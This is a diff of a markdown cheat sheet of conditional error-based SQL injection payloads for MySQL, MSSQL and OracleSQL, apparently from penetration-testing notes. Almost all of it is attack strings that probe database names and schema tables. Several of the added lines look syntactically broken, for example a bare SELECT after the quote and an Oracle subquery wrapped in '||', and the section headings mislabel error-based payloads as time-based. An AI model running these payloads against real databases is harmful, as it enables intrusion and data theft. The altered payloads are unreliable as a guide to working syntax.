@@ -13,7 +13,7 @@ The process is relatively the same as [Boolean Based](boolean-based.md) injectio
 A time-based SQLi payload in MySQL will look like this
 
 ```bash
-1' AND IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')--
+1' SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')--
 ```
 
 Examples:
@@ -23,7 +23,7 @@ Examples:
 1' AND (SELECT LENGTH(database()))=1-- -
 
 #Error Based  
-1' AND IF((SELECT LENGTH(database()))=1,(SELECT table_name FROM information_schema.tables),'a')--
+1' SELECT IF((SELECT LENGTH(database()))=1,(SELECT table_name FROM information_schema.tables),'a')--
 ```
 {% endtab %}
 
@@ -31,7 +31,7 @@ Examples:
 A time-based SQLi payload in MSSQL will look like this
 
 ```bash
-1' AND CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END--
+1'; SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END--
 ```
 
 Examples:
@@ -41,7 +41,7 @@ Examples:
 1' AND (SELECT LEN(DB_NAME()))=1--
 
 #Error Based  
-1' AND CASE WHEN ((SELECT LEN(DB_NAME()))=1) THEN 1/0 ELSE NULL END--
+1'; SELECT CASE WHEN ((SELECT LEN(DB_NAME()))=1) THEN 1/0 ELSE NULL END--
 ```
 {% endtab %}
 
@@ -49,7 +49,7 @@ Examples:
 A time-based SQLi payload in OracleSQL will look like this
 
 ```bash
-1' AND CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual--
+1' || SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual ||--
 ```
 
 Examples:
@@ -59,7 +59,7 @@ Examples:
 1' AND (SELECT LENGTH(global_name) FROM global_name)=1--
 
 #Error Based  
-1' AND CASE WHEN ((SELECT LENGTH(global_name) FROM global_name)=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual--
+1' SELECT CASE WHEN ((SELECT LENGTH(global_name) FROM global_name)=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual--
 ```
 {% endtab %}
 
